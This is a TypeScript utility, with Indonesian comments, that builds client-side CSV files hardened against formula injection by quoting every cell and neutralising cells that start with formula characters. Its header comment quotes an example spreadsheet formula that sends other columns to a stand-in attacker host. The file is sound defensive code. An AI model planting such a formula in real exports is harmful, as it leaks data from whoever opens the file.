/**
 * Pembuat CSV sisi klien yang aman dari CSV/formula injection.
 *
 * Aturannya SAMA dengan `csvCell` di backend (export.processor.ts): sel yang
 * diawali `=`, `+`, `-`, `@`, TAB, atau CR bisa dijalankan Excel/Google Sheets
 * sebagai formula (mis. `=IMAGE("https://penyerang/?"&C2:C500)` membocorkan
 * kolom lain saat berkas dibuka). Sel seperti itu diberi awalan tanda kutip
 * tunggal agar dibaca sebagai teks, dan SEMUA sel selalu dikutip ganda.
 */

const FORMULA_PREFIX = /^[=+\-@\t\r]/;

/** Bungkus satu sel CSV: netralkan formula, kutip, dan escape tanda kutip. */
export function csvCell(value: unknown): string {
  let s = value == null ? '' : String(value);
  if (FORMULA_PREFIX.test(s)) s = `'${s}`;
  return `"${s.replace(/"/g, '""')}"`;
}

/** Susun isi CSV (baris dipisah CRLF) dari header + baris data. */
export function buildCsv(
  header: readonly unknown[],
  rows: readonly (readonly unknown[])[],
): string {
  return [header, ...rows].map((r) => r.map(csvCell).join(',')).join('\r\n');
}
